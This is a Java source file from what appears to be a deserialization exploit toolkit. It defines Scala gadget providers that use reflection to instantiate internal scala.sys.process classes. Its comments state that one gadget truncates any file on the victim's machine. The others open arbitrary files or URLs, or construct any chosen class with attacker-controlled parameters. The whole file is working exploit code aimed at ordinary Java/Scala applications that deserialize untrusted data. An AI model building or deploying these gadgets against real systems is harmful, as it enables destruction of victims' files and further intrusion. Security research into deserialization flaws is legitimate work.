package dev.silente.javashark.gadget.scala;

import dev.silente.javashark.utils.ReflectUtils;
import scala.Function0;
import scala.sys.process.ProcessBuilder$;

import java.io.File;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.function.Function;

public class DefaultProviders {
    public static final Function<Object[], Function0<Object>> FILE_OUTPUT = DefaultProviders::fileOutput;
    public static final Function<Object[], Function0<Object>> FILE_INPUT = DefaultProviders::fileInput;
    public static final Function<Object[], Function0<Object>> URL_INPUT = DefaultProviders::urlInput;
    public static final Function<Object[], Function0<Object>> CUSTOM = DefaultProviders::customFunction;

    /**
     * When invoked, instantiates new FileOutputStream(String fileName, boolean append) with controlled parameters is
     * called. If append is false, right after creating, specified file is truncated (written with 0). Which means you can
     * truncate any file on victim's machine which victim has write access to.
     * @param args args[0]: String, file name to truncate; args[1]: boolean, whether to append or overwrite.
     * @return Function0 instance which can overwrite any file with zero when Object apply() is invoked
     */
    public static Function0<Object> fileOutput(Object[] args) {
        String fileToTruncate = (String) args[0];
        boolean append = (Boolean) args[1];
        return ReflectUtils.newInstance("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3",
                new Class[]{ ProcessBuilder$.class, File.class, boolean.class},
                new Object[] {null, new File(fileToTruncate), append});
    }

    /**
     * When invoked, new FileInputStream(String fileName) with controlled parameter is called.
     * @param args args[0]: String, file name to open FileInputStream
     * @return - new FileInputStream(fileName)
     */
    public static Function0<Object> fileInput(Object[] args) {
        String fileName = (String) args[0];
        return ReflectUtils.newInstance("scala.sys.process.ProcessBuilderImpl$FileInput$$anonfun$$lessinit$greater$2",
                new Class[]{ ProcessBuilder$.class, File.class},
                new Object[] {null, new File(fileName)});
    }

    /**
     * When invoked, url.openStream() with controlled URL is called.
     * @param args args[0]: String, url string to open InputStream
     * @return - new URL(url).openStream()
     */
    public static Function0<Object> urlInput(Object[] args) {
        try {
            URL url = new URL((String) args[0]);
            return ReflectUtils.newInstance("scala.sys.process.ProcessBuilderImpl$URLInput$$anonfun$$lessinit$greater$1",
                    new Class[]{ scala.sys.process.ProcessBuilder$.class, URL.class},
                    new Object[] {null, url});
        }
        catch (MalformedURLException e) {
            throw new RuntimeException(e);
        }
    }

    /**
     * Custom function invoked
     * @param args args[0]: className; args[1]: types; args[2]: params
     */
    public static Function0<Object> customFunction(Object[] args) {
        String className = (String) args[0];
        Class[] types = (Class[]) args[1];
        Object[] params = (Object[]) args[2];
        return ReflectUtils.newInstance(className, types, params);
    }
}
